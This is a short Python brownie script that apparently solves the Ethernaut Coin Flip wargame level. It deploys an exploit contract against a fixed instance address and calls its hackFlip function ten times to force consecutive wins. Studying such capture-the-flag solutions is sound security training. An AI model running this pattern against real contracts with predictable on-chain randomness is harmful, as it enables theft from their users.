from brownie import interface, accounts, config, CoinFlipHack

INSTANCE_ADDRESS = "0x96e999231F7DcAA7D6c181FC1536C2F054eFb6DD"
ACCOUNT = accounts.add(config["wallets"]["from_key"])

def hack():
    # grab the Coin Flip contract Object
    instance_contract = interface.ICoinFlip(INSTANCE_ADDRESS)
    # deploy the exploit contract
    exploit_contract = CoinFlipHack.deploy(INSTANCE_ADDRESS, {"from": ACCOUNT})

    # call the exploit function 10 times
    for i in range(10):
        tx = exploit_contract.hackFlip({"from": ACCOUNT})
        # wait 2 seconds betwen each call 
        tx.wait(2)
    
    print(f"Contract has been hacked. we win {instance_contract.consecutiveWins()} consecutive times")

def main():
    hack()
